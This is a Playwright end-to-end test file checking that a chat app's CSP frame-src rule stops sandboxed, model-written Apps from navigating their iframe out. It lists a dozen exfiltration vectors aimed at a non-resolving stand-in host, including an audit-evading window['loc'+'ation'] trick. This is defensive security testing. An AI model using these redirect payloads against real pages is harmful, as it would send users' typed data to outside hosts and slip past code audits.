import { randomUUID } from "node:crypto";
import { expect, type Page, test } from "@playwright/test";
import { eq } from "drizzle-orm";
import { db } from "../../src/lib/server/db";
import {
	artifactKv,
	artifacts,
	artifactVersions,
	users,
} from "../../src/lib/server/db/schema";
import { createEmptyConversation, login } from "./helpers";

// An App is code a model wrote, running in a frame of our own page. It can
// send the browser anywhere by navigating that frame, and an address is all it
// takes to carry what the reader typed into it out of the app:
// `location = "https://elsewhere/?" + secret`. The App's own CSP cannot stop
// that (`navigate-to`, the directive that would, shipped in no browser), the
// regex audit at write time can be evaded (`window["loc"+"ation"]`), and the
// page's `frame-src 'self'` is the only brake: it is enforced even while
// CSP_MODE is report-only, and this spec is what holds it there.
//
// The Apps below are seeded straight into the database, past the write audit
// that would refuse the obvious ones, because the point is what the BROWSER
// does with code that got through. The stand-in host is on `.invalid`, which
// never resolves (RFC 2606), and every request to it is counted twice, by
// `page.route` and by the request event, across the whole browser context so
// a popup could not hide one.

const SENTINEL_HOST = "sentinel.invalid";
const TARGET = `https://${SENTINEL_HOST}/leak?data=what-the-reader-typed`;

interface Vector {
	name: string;
	/** Runs after the bridge has confirmed the app is alive. */
	script?: string;
	/** Markup in <head>, for what needs no script at all. */
	head?: string;
	body?: string;
}

const VECTORS: Vector[] = [
	{ name: "location = url", script: `location = ${JSON.stringify(TARGET)};` },
	{
		name: "window.location.href = url",
		script: `window.location.href = ${JSON.stringify(TARGET)};`,
	},
	{
		name: 'window["loc"+"ation"] = url (what the write audit cannot see)',
		script: `window["loc"+"ation"] = ${JSON.stringify(TARGET)};`,
	},
	{
		name: "an aliased window, const w = window; w.location = url",
		script: `const w = window; w.location = ${JSON.stringify(TARGET)};`,
	},
	{
		name: "location.assign(url)",
		script: `location.assign(${JSON.stringify(TARGET)});`,
	},
	{
		name: "location.replace(url)",
		script: `location.replace(${JSON.stringify(TARGET)});`,
	},
	{
		name: "a meta refresh",
		head: `<meta http-equiv="refresh" content="1;url=${TARGET}">`,
	},
	{
		name: "an anchor click",
		script: `var a = document.createElement("a"); a.href = ${JSON.stringify(TARGET)}; document.body.appendChild(a); a.click();`,
	},
	{
		name: "a form submit",
		body: `<form id="leak" action="${TARGET}" method="get"><input name="q" value="secret"></form>`,
		script: `document.getElementById("leak").submit();`,
	},
	{
		name: "window.open(url)",
		script: `window.open(${JSON.stringify(TARGET)});`,
	},
	{
		name: "top.location = url",
		script: `try { top.location = ${JSON.stringify(TARGET)}; } catch (e) {}`,
	},
	{
		name: "a nested iframe",
		script: `var f = document.createElement("iframe"); f.src = ${JSON.stringify(TARGET)}; document.body.appendChild(f);`,
	},
];

/**
 * An App that says it is alive (a write through the real storage bridge, which
 * the test reads back out of the database), then tries one way out.
 */
function leakyApp(vector: Vector): string {
	return `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Leaky App</title>${vector.head ?? ""}</head>
<body>
<h1>Leaky App</h1>
${vector.body ?? ""}
<script>
window.alfy.storage.set("alive", "yes").then(function () {
  ${vector.script ?? ""}
});
</script>
</body>
</html>`;
}

async function testUserId(): Promise<string> {
	const [user] = await db
		.select({ id: users.id })
		.from(users)
		.where(eq(users.email, "admin@local"))
		.limit(1);
	expect(user, "the e2e admin must exist").toBeTruthy();
	return user.id;
}

async function seedApp(conversationId: string, html: string): Promise<string> {
	const userId = await testUserId();
	const artifactId = randomUUID();
	const now = new Date();
	await db.insert(artifacts).values({
		id: artifactId,
		userId,
		conversationId,
		type: "artifact",
		retrievalClass: "durable",
		name: "Leaky App",
		contentText: html,
		metadataJson: JSON.stringify({ artifactType: "app", title: "Leaky App" }),
		createdAt: now,
		updatedAt: now,
	});
	await db.insert(artifactVersions).values({
		id: randomUUID(),
		artifactId,
		userId,
		versionNumber: 1,
		author: "alfy",
		summary: "Seeded past the write audit",
		body: html,
		bodyHash: "seed-hash",
		createdAt: now,
	});
	return artifactId;
}

/** Every request to the stand-in host, from any page of the browser context. */
async function watchSentinel(page: Page) {
	const routed: string[] = [];
	const seen: string[] = [];
	await page
		.context()
		.route(
			new RegExp(`^https?://${SENTINEL_HOST.replace(/\./g, "\\.")}(?::\\d+)?/`),
			async (route) => {
				routed.push(route.request().url());
				await route.fulfill({
					status: 200,
					contentType: "text/html",
					body: "<h1>sentinel reached</h1>",
				});
			},
		);
	page.context().on("request", (request) => {
		if (new URL(request.url()).hostname === SENTINEL_HOST) {
			seen.push(request.url());
		}
	});
	return { routed, seen };
}

async function openApp(page: Page, conversationId: string) {
	await page.goto(`/chat/${conversationId}`, { waitUntil: "networkidle" });
	await page.getByTestId("artifact-count-button").click();
	await page
		.getByTestId("artifact-panel-list")
		.getByTestId("artifact-row")
		.first()
		.click();
	// An App that leaves is torn down by the tripwire (ruling 58) within a tick
	// of its first attempt, so the frame may already be gone: either is "open".
	await expect(
		page.locator("iframe.app-frame, .app-frame-tripwire").first(),
	).toBeVisible();
}

async function aliveRows(artifactId: string) {
	return db
		.select({ key: artifactKv.key })
		.from(artifactKv)
		.where(eq(artifactKv.artifactId, artifactId));
}

test.describe("an App navigating its own frame out", () => {
	test.beforeEach(async ({ page }) => {
		await login(page);
	});

	test("the page that frames an App carries an enforced frame-src, whatever CSP_MODE says about the rest", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Frame rule");
		const response = await page.goto(`/chat/${conversationId}`);
		const enforced = response?.headers()["content-security-policy"];

		// `off` is the only mode without it, and the escape hatch an operator must
		// choose by name; a server started with CSP_MODE=off cannot run this spec.
		expect(
			enforced,
			"the chat page must send an enforcing Content-Security-Policy with the frame rule (is CSP_MODE=off in this server's environment?)",
		).toBeTruthy();
		expect(enforced).toMatch(/(^|;\s*)frame-src 'self'(;|$)/);
	});

	for (const vector of VECTORS) {
		test(`${vector.name}: the browser makes no request to the host it names`, async ({
			page,
		}) => {
			const sentinel = await watchSentinel(page);
			const conversationId = await createEmptyConversation(page, "Leaky");
			const artifactId = await seedApp(conversationId, leakyApp(vector));

			await openApp(page, conversationId);

			// The App ran, and said so through the real bridge before it tried.
			await expect
				.poll(async () => (await aliveRows(artifactId)).map((r) => r.key), {
					message: "the App never reported in; its script did not run",
				})
				.toEqual(["alive"]);

			// Long enough for a script-driven attempt and for the meta refresh
			// (1 s) to have fired, and for a request to have gone out.
			await page.waitForTimeout(2_500);

			expect(sentinel.routed, "requests to the stand-in host").toEqual([]);
			expect(sentinel.seen, "requests to the stand-in host").toEqual([]);
		});
	}

	// What makes the cases above mean something: a frame navigation IS visible
	// to this harness when it is allowed, and `frame-src 'self'` allows exactly
	// the app's own origin. An App that leaves for a page of ours is still
	// caught by ruling 58's tripwire (artifact-app.spec.ts), not by the CSP.
	test("control: a navigation to our own origin is a request the harness sees, and is still allowed", async ({
		page,
	}) => {
		const requests: string[] = [];
		page.context().on("request", (request) => {
			if (new URL(request.url()).pathname === "/api/health") {
				requests.push(request.url());
			}
		});
		const conversationId = await createEmptyConversation(page, "Control");
		await seedApp(
			conversationId,
			leakyApp({
				name: "same origin",
				script: `location = "/api/health?frame-control=1";`,
			}),
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => requests.some((url) => url.includes("frame-control=1")))
			.toBe(true);
	});

	test("control: the stand-in route does count a navigation that nothing forbids", async ({
		page,
	}) => {
		const sentinel = await watchSentinel(page);

		// A page of its own, outside the app's frames, so no frame-src applies.
		const lone = await page.context().newPage();
		await lone.goto(TARGET).catch(() => undefined);

		expect(sentinel.routed).toHaveLength(1);
		expect(sentinel.seen).toHaveLength(1);
		await lone.close();
	});
});
